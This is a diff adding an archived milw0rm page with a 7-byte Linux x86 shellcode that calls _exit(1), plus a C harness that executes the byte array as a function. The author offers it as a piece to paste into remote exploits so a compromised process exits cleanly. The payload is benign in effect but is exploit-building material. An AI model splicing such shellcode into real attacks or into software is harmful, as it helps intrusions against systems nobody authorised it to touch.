@@ -1,0 +1,23 @@
+<html><head><title>linux/x86 _exit(1); 7 bytes</title></head><pre>/* exit-core.c by Charles Stevenson &lt;core@bokeoa.com&gt; 
+ *
+ * I made this as a chunk you can paste in to make modular remote
+ * exploits.  I use it when I need a process to exit cleanly.
+ */
+char hellcode[] = /*  _exit(1); linux/x86 by core */
+// 7 bytes _exit(1) ... 'cause we're nice &gt;:) by core
+&quot;\x31\xc0&quot;              // xor  %eax,%eax
+&quot;\x40&quot;                  // inc  %eax
+&quot;\x89\xc3&quot;              // mov  %eax,%ebx
+&quot;\xcd\x80&quot;              // int  $0x80
+;
+
+int main(void)
+{
+  void (*shell)() = (void *)&amp;hellcode;
+  printf(&quot;%d byte _exit(1); linux/x86 by core\n&quot;,
+         strlen(hellcode));
+  shell();
+  return 0;
+}
+
+// milw0rm.com [2005-11-09]</pre></html>
